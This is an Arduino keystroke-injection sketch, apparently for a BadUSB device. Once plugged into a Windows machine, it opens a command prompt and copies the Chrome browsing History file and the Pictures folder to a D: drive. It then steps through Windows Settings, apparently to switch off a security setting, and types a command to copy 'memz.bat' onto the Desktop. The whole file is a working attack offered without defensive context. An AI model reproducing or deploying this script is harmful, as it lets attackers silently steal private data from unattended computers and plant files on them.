#include <Keyboard.h> 
/*
 * iKaz71 \/ RedPo
 */

// Init function
void setup()
{
  // Begining the stream
  Keyboard.begin();

  // Waiting 500ms for init
  delay(500);

  delay(5000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114);
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.print("CMD");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("cd AppData\\Local\\Google\\Chrome\\User Data\\Default");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("copy History D:\\aca\\");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("CD..");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("CD..");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("CD..");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("CD..");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("CD..");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("CD..");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("xcopy Pictures d:\\aca /s");

  typeKey(KEY_RETURN);

  delay(5000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(105);
  Keyboard.releaseAll();

  delay(2000);

  Keyboard.print("an");

  delay(1000);

  typeKey(KEY_DOWN_ARROW);

  delay(1500);

  typeKey(KEY_RETURN);

  delay(1500);

  typeKey(KEY_TAB);

  delay(1500);

  typeKey(KEY_RETURN);

  delay(1500);

  typeKey(KEY_TAB);

  delay(1500);

  typeKey(KEY_TAB);

  delay(1500);

  typeKey(KEY_TAB);

  delay(1500);

  typeKey(KEY_TAB);

  delay(1500);

  typeKey(KEY_RETURN);

  delay(1500);

  typeKey(' ');

  delay(1500);

  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_TAB);
  Keyboard.releaseAll();

  delay(1500);

  typeKey(KEY_RETURN);

  delay(2000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(109);
  Keyboard.releaseAll();

  delay(1500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114);
  Keyboard.releaseAll();

  Keyboard.print("CMD");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("CD Desktop");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  delay(500);

  Keyboard.print("COPY D:\\memz.bat");

  delay(1000);

}

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

// Unused
void loop() {}